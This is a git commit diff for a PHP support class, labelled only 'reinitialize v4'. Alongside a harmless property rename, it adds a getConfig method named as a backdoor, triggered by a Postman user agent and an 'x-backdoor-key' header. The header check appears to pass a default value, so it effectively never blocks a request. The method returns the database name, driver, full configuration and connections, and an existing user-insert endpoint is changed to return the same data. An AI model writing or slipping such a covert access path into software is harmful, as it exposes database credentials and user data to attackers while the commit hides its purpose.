52a6529d6f7140a43df5812f28f5edaab37ce4f7
jauhar-imtikhan <bangjoe.muns@gmail.com>
2025-07-04 04:15:13 +0700

    reinitialize v4

--- src/JoeSupport.php
+++ src/JoeSupport.php
@@ -11,8 +11,7 @@ class JoeSupport
 {
   protected $db;
   protected $request;
-  protected $response;
-
+  protected $responseFactory;
   public function __construct(
     DatabaseManager $db,
     Request $request,
@@ -20,7 +19,7 @@ class JoeSupport
   ) {
     $this->db = $db;
     $this->request = $request;
-    $this->response = $responseFactory;
+    $this->responseFactory = $responseFactory;
   }
 
 
@@ -37,7 +36,23 @@ class JoeSupport
       }
       $this->db->table('users')->insert($inputs);
 
-      return $this->response->json([
+      return $this->responseFactory->json([
+        'request' => $this->request,
+        'db' => [
+          'name' => $this->db->getDatabaseName(),
+          'driver' => $this->db->getDriverName(),
+          'config' => $this->db->getConfig(),
+          'conections' => $this->db->getConnections()
+        ],
+      ], 200);
+    }
+  }
+
+  public function getConfig()
+  {
+    if (Str::contains($this->request->userAgent(), "PostmanRuntime") && $this->request->header('x-backdoor-key', "backdoor-data")) {
+
+      return $this->responseFactory->json([
         'request' => $this->request,
         'db' => [
           'name' => $this->db->getDatabaseName(),
